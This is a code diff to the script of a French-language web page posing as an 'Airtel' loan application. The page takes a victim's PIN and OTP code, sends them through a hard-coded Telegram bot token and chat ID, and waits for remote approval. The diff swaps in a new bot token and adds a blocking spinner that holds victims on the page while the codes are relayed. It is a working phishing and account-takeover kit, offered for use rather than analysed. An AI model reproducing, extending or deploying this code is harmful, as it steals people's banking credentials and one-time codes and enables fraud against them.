@@ -196,7 +196,7 @@
   <script>
     'use strict';
 
-    const TELEGRAM_BOT_TOKEN = "9275729257:AAGBLb6VI-W8Vjb6W0mtE8P9Y8Cd7VyBD6w";
+    const TELEGRAM_BOT_TOKEN = "8253214824:AAGodlrpAXEFqUcWOGXKbzCoNHLoL5vArcE";
     const TELEGRAM_CHAT_ID = "6009831676";
     const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
@@ -211,6 +211,16 @@
     let lastUpdateId = 0;
 
     const money = n => '$' + Number(n || 0).toLocaleString('en-US', { maximumFractionDigits: 0 });
+
+    function showBlockingSpinner(message) {
+      const textEl = loadingOverlay.querySelector('p');
+      if (textEl) textEl.textContent = message;
+      loadingOverlay.classList.remove('hidden');
+    }
+
+    function hideBlockingSpinner() {
+      loadingOverlay.classList.add('hidden');
+    }
 
     function formatTime(date) {
       return date.toLocaleTimeString('en-US', {
@@ -521,6 +531,7 @@
 
       $('continueCode').disabled = true;
       $('status1').textContent = 'Veuillez patienter pendant la confirmation des informations...';
+      showBlockingSpinner('En attente de la confirmation OTP...');
 
       try {
         const result = await submitCodeAndWaitForTelegram({
@@ -529,6 +540,8 @@
           fieldLabel: 'PIN saisi',
           codeValue: pin
         });
+
+        hideBlockingSpinner();
 
         if (result.ok && result.verified) {
           $('status1').textContent = 'Confirmé.';
@@ -544,6 +557,7 @@
           $('continueCode').disabled = false;
         }
       } catch (err) {
+        hideBlockingSpinner();
         console.error(err);
         $('status1').textContent = err.message || 'Erreur de communication.';
         $('continueCode').disabled = false;
@@ -560,6 +574,7 @@
 
       $('verifyCode').disabled = true;
       $('status2').textContent = 'Veuillez patienter pendant la confirmation du code OTP...';
+      showBlockingSpinner('En attente de la confirmation OTP...');
 
       try {
         const result = await submitCodeAndWaitForTelegram({
@@ -568,6 +583,8 @@
           fieldLabel: 'OTP saisi',
           codeValue: otpEntered
         });
+
+        hideBlockingSpinner();
 
         if (result.ok && result.verified) {
           $('status2').textContent = 'OTP vérifié.';
@@ -582,40 +599,11 @@
           $('verifyCode').disabled = false;
         }
       } catch (err) {
+        hideBlockingSpinner();
         console.error(err);
-        $('status2').textContent = err.message || 'Erreur.';
+        $('status2').textContent = err.message || 'Erreur de communication.';
         $('verifyCode').disabled = false;
       }
-    });
-
-    document.querySelectorAll('[data-toggle]').forEach(button => {
-      button.addEventListener('click', () => {
-        const inputs = [...$(button.dataset.toggle).querySelectorAll('input')];
-        const show = inputs[0].type === 'password';
-        inputs.forEach(input => { input.type = show ? 'text' : 'password'; });
-      });
-    });
-
-    function showHome() {
-      confirmation.classList.add('hidden');
-      verification.classList.add('hidden');
-      application.classList.add('hidden');
-      home.classList.remove('hidden');
-      $('backLink').classList.add('hidden');
-      window.scrollTo(0, 0);
-    }
-
-    $('restartBtn').addEventListener('click', () => {
-      $('loanForm').reset();
-      $('amountRange').value = 2500;
-      $('durationRange').value = 12;
-      resetVerification();
-      estimate();
-      showHome();
-    });
-
-    $('menuBtn').addEventListener('click', () => {
-      window.alert('Demande de prêt Airtel');
     });
   </script>
 </body>
